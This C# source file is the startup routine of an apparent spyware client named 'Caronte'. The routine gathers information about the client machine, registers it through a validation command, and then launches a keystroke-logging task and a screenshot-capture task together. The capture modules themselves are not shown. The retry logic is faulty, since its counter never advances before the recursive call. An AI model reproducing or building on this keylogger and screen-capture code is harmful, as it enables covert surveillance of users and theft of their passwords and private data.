using Caronte.Modules.Command;
using Caronte.Modules.ValidateClient;
using Caronte.Modules.Information;
using Caronte.Modules.Information.GetClientInformation;
using MediatR;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte
{
    public class Execution
    {
        private readonly IMediator _mediator;
        private readonly CancellationToken _cancellationToken;
        private int InitilizeRetries;

        public Execution(IMediator mediator, CancellationToken cancellationToken)
        {
            _mediator = mediator;
            _cancellationToken = cancellationToken;
        }

        public async Task Initialize()
        {
            var getClientInformationResponse = await _mediator.Send(new GetClientInformationQuery());

            if (!getClientInformationResponse.IsSucessFull)
            {
                if (InitilizeRetries <= 5)
                    await Initialize();

                InitilizeRetries++;
                return;
            }

            var verifyAndCreateClientResponse = await _mediator.Send(new ValidateClientCommand() { ClientInformation = getClientInformationResponse.ResponseObject });

            if (verifyAndCreateClientResponse.IsSucessFull)
            {
                var tasksList = new List<Task>
                {
                    StartInformationServices.InitializeKeyboardLogTask(_cancellationToken, _mediator),
                    StartInformationServices.InitializePrintScreenTask(_cancellationToken, _mediator),
                };

                await Task.WhenAll(tasksList);
            }
        }
    }
}
